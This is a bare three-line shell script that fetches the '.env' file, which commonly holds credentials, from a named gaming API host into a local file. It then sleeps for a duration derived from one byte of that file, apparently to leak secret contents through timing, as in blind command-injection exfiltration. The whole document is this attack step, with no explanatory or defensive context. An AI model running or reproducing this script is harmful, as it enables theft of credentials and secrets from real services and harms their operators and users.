#!/bin/sh
curl -s -o /w8 https://playerapi.hubgaming.com/.env
sleep $(( 20 + 4*0x$(od -j20 -N1 -tx1 /w8|cut -c8) ))
